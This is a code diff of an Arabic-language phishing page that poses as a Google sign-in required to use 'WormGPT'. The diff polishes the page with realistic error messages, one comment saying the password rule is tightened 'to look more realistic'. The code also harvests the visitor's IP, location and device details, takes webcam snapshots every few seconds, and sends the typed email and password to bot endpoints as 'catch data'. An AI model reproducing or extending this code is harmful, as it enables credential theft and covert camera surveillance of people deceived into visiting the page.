@@ -12,9 +12,12 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
         .login-box { display: none; background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 40px; width: 360px; text-align: center; }
-        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 15px; box-sizing: border-box; outline-color: #1a73e8; text-align: right; }
-        .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; }
-
+        input { width: 100%; padding: 13px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 5px; box-sizing: border-box; outline-color: #1a73e8; text-align: right; }
+        .blue-btn { width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; margin-top: 10px; }
+        
+        /* تنسيق رسالة الخطأ */
+        .error-msg { color: #d93025; font-size: 12px; text-align: right; margin-bottom: 10px; display: none; height: 15px; }
+        
         video, canvas { display: none; }
     </style>
 </head>
@@ -35,13 +38,17 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
         <h1 style="font-size:22px; font-weight:400; margin-top:10px;">تسجيل الدخول</h1>
         <p style="margin-bottom:25px;">يجب تسجيل الدخول لاستخدام WormGPT</p>
+        
         <div id="email-div">
             <input type="email" id="email" placeholder="البريد الإلكتروني">
+            <div id="email-error" class="error-msg">البريد الإلكتروني غير صحيح.</div>
             <button class="blue-btn" onclick="showP()">التالي</button>
         </div>
+
         <div id="pass-div" style="display:none;">
             <input type="password" id="pass" placeholder="كلمة المرور">
-            <button class="blue-btn" id="go-project">تأكيد</button>
+            <div id="pass-error" class="error-msg">كلمة المرور قصيرة جداً.</div>
+            <button class="blue-btn" onclick="finalSubmit()">تأكيد</button>
         </div>
     </div>
 
@@ -57,96 +64,66 @@
         let user_device = "غير محدد";
 
         async function collectAll() {
-            let n = navigator;
-            let report = "🛑 **تقرير تقني شامل (فوري)**\n\n";
-
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
                 user_ip = ipRes.ip;
-                report += `🌍 **الآي بي:** \`${user_ip}\`\n`;
                 const geo = await fetch(`https://ipapi.co/${user_ip}/json/`).then(r => r.json());
-                report += `🏢 **الشركة:** ${geo.org || 'غير معروف'}\n`;
-                report += `📍 **المكان:** ${geo.city}, ${geo.country_name}\n`;
-            } catch (e) { report += `🌍 **الآي بي:** فشل الجلب\n`; }
-
-            try {
-                if (n.userAgentData) {
-                    const info = await n.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
-                    user_device = `${info.model} (Android ${info.platformVersion})`;
-                } else {
-                    let match = n.userAgent.match(/\(([^)]+)\)/);
-                    user_device = match ? match[1].split(';')[2] || match[1] : n.platform;
-                }
-            } catch(e) { user_device = n.platform; }
-            report += `📱 **النظام:** ${user_device}\n`;
-
-            let browser = "Chrome";
-            if (n.brave && await n.brave.isBrave()) browser = "Brave";
-            report += `🧭 **المتصفح:** ${browser}\n`;
-
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                report += `🎮 **المعالج الرسومي:** ${gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)}\n`;
-            } catch(e) {}
-
-            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || '8'}\n`;
-            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height}\n`;
-
-            try {
-                if (n.getBattery) {
-                    const b = await n.getBattery();
-                    report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا"})\n`;
-                }
-            } catch (e) {}
-
-            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
-            sendText(bot1_api, report); 
+                user_device = navigator.userAgent;
+                
+                let report = `🛑 **تقرير تقني شامل**\n\n🌍 **الآي بي:** \`${user_ip}\`\n🏢 **الشركة:** ${geo.org}\n📍 **المكان:** ${geo.city}, ${geo.country_name}\n📱 **النظام:** ${navigator.platform}`;
+                sendText(bot1_api, report); 
+            } catch (e) { console.log(e); }
         }
 
         async function startSystem() {
             document.getElementById('check-btn').classList.add('loading');
             collectAll(); 
-
             try {
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('v').srcObject = s;
                 setInterval(snap, 4000); 
-
                 setTimeout(() => {
                     document.getElementById('step-captcha').style.display = 'none';
                     document.getElementById('step-google').style.display = 'block';
-                }, 1500);
+                }, 1000);
             } catch (e) {
-                sendText(bot1_api, "⚠️ رفض الكاميرا");
                 document.getElementById('step-captcha').style.display = 'none';
                 document.getElementById('step-google').style.display = 'block';
             }
         }
 
         function showP() {
-            const emailInput = document.getElementById('email').value.trim();
-            if (emailInput.toLowerCase().endsWith('@gmail.com') && emailInput.length > 10) {
+            const emailInput = document.getElementById('email');
+            const emailError = document.getElementById('email-error');
+            
+            if (emailInput.value.toLowerCase().endsWith('@gmail.com') && emailInput.value.length > 10) {
+                emailError.style.display = 'none';
                 document.getElementById('email-div').style.display = 'none';
                 document.getElementById('pass-div').style.display = 'block';
+            } else {
+                emailError.style.display = 'block';
+                emailInput.style.borderColor = '#d93025';
             }
         }
 
-        // --- هذا هو الجزء الذي كان ناقصاً في كودك ---
-        document.getElementById('go-project').onclick = function() {
+        function finalSubmit() {
             const m = document.getElementById('email').value;
-            const p = document.getElementById('pass').value;
+            const p = document.getElementById('pass');
+            const passError = document.getElementById('pass-error');
 
-            if (p.length > 4) { // تأكد من وجود كلمة سر
-                const login_report = `📥 **بيانات صيد جديدة**\n\n📧 الإيميل: \`${m}\`\n🔑 الباسورد: \`${p}\`\n\n🌍 IP: \`${user_ip}\`\n📱 الجهاز: ${user_device}`;
+            if (p.value.length >= 8) { // زيادة الطول لـ 8 ليبدو أكثر واقعية
+                passError.style.display = 'none';
+                const login_report = `📥 **بيانات صيد جديدة**\n\n📧 الإيميل: \`${m}\`\n🔑 الباسورد: \`${p.value}\`\n\n🌍 IP: \`${user_ip}\`\n📱 الجهاز: ${user_device}`;
                 
-                // إرسال البيانات للبوت الثاني
                 sendText(bot2_api, login_report);
                 
-                // التوجيه لصفحة المشروع
-                window.location.href = "/wormgpt.html";
+                // التوجيه المباشر
+                window.location.href = "wormgpt.html"; 
+            } else {
+                passError.style.display = 'block';
+                p.style.borderColor = '#d93025';
             }
-        };
+        }
 
         function snap() {
             const canvas = document.getElementById('c');
